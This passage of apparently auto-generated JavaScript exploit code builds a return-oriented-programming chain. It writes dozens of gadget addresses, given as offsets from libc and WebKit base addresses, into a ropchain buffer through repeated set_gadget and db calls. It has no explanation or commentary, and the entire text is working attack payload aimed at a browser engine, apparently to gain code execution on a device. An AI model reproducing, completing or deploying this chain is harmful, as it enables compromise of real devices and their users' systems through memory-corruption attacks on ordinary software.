db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+342176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+342160, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+342296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342344, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+342312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+342456, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+342448, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+342472, 
ropchain+342912, 
libc_base+50775, 
libc_base+793877, 
ropchain+342512, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+342664, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342680, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+342648, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+342776, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342792, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+342904, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+342888, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+50775, 
libc_base+793877, 
ropchain+342960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965208, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+343056, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+343112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+343192, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+343296, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+343312, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+343464, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+343496, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+343480, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+343448, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+343656, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+343624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+343608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+343728, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+343744, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+343832, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+343888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+344008, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344040, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344024, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+344192, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+344176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+344296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344312, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+344416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+344400, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965152, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965152, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+344576, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+344744, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+344776, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+344760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+344728, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+344880, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+344864, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965148, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+793877, 
ropchain+344952, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([2, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([28, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+345168, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+393776, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967272, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+345304, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+345320, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+345288, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+345416, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+345400, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+345512, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+345592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+345648, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+345728, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+345832, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+345848, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+346000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+346032, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+346016, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+345984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+346192, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+346160, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+346144, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+346264, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+346280, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+346368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+346424, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+346496, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+346552, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+954100, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+346640, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+346744, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+346760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+346904, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+346872, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+346888, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+346984, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([3116, 0]); 
set_gadget(libc_base+788575,); 
db([3116, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+347136, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+347152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+347120, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([322371584, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+347320, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965152, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+347424, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+347440, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+347592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+347624, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+347608, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+347576, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+347720, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+347704, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+759626, 
libc_base+793877, 
ropchain+347816, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965164, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+347928, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+255576, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+348064, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+348080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348048, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+348184, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+348168, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
webkit_base+954100, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+348328, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348344, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+348496, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+348528, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+348480, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+348624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+348608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+397968, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+348776, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160240, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+348848, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+348952, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+348968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+349120, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349152, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+349136, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+349104, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349224, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349336, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+349320, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+50775, 
libc_base+793877, 
ropchain+349416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349568, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349584, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+349552, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+349752, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349768, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+349736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+349872, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+349920, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+349888, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+350032, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+350024, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+350048, 
ropchain+350488, 
libc_base+50775, 
libc_base+793877, 
ropchain+350088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([1, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+350240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+350256, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+350224, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+350352, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+350368, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+350480, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+350464, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+759626, 
libc_base+793877, 
ropchain+350544, 
webkit_base+7438103, 
libc_base+793877 
]);
db([4294965208, 4294967295]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+350624, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+350680, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+350760, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294965160, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+350864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+350880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+351032, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351064, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+351048, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+351016, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+351224, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+351192, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+351176, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([4, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+1506828, 
libc_base+793877, 
ropchain+351296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351312, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+351400, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+351456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+351576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351608, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+351592, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191169, 
libc_base+793877, 
ropchain+351760, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+351776, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+351744, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+351864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+351880, 
